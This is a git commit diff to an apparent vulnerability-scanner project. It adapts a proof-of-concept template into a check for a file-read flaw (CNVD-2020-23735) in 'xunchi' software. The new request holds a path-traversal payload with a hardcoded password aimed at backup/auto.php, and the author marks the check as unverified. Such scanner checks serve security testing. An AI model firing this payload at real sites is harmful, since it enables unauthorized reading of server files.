a4711b1fe5627af919e81c6caae845a67dc217a6
amcai <ai1102a428+mygithubproject@gmail.com>
2020-11-02 16:49:56 +0800

    add poc_xunchi-cnvd-2020-23735-file-read_2020

--- myscan/pocs/perfolder/xunchi/poc_xunchi-cnvd-2020-23735-file-read_2020.py
+++ myscan/pocs/perfolder/xunchi/poc_xunchi-cnvd-2020-23735-file-read_2020.py
@@ -1,7 +1,8 @@
 # !/usr/bin/env python3
 # @Time    : 2020/11/2
 # @Author  : caicai
-# @File    : poc_ueditor_cnvd-2017-20077-file-upload.py
+# @File    : poc_xunchi-cnvd-2020-23735-file-read_2020.py
+
 
 '''
 未验证
@@ -17,8 +18,8 @@ class POC():
         self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
         self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
         self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
-        self.name = "ueditor_cnvd-2017-20077-file-upload"
-        self.vulmsg = "link : https://zhuanlan.zhihu.com/p/85265552 ,https://www.freebuf.com/vuls/181814.html"
+        self.name = "xunchi-cnvd-2020-23735-file-read"
+        self.vulmsg = "link : https://www.cnvd.org.cn/flaw/show/2025171"
         self.level = 2  # 0:Low  1:Medium 2:High
 
     def verify(self):
@@ -27,7 +28,7 @@ class POC():
             return
 
         req = {
-            "url": self.url + "ueditor/net/controller.ashx?action=catchimage&encode=utf-8",
+            "url": self.url + "backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php",
             "method": "GET",
             "headers": {
                 "Accept-Encoding": "deflate"},
@@ -35,7 +36,7 @@ class POC():
             "timeout": 10,
         }
         r = request(**req)
-        if r is not None and r.status_code == 200 and b"\xe6\xb2\xa1\xe6\x9c\x89\xe6\x8c\x87\xe5\xae\x9a\xe6\x8a\x93\xe5\x8f\x96\xe6\xba\x90" in r.content:
+        if r is not None and r.status_code == 200 and b"NzbwpQSdbY06Dngnoteo2wdgiekm7j4N" in r.content and b"display_errors" in r.content:
             parse = response_parser(r)
             self.result.append({
                 "name": self.name,
@@ -43,7 +44,6 @@ class POC():
                 "level": self.level,  # 0:Low  1:Medium 2:High
                 "detail": {
                     "vulmsg": self.vulmsg,
-                    "others": "you can exploit it by :http://localhost/ueditor/net/controller.ashx?action=catchimage&encode=utf-8",
                     "request": parse.getrequestraw(),
                     "response": parse.getresponseraw(),
                 }
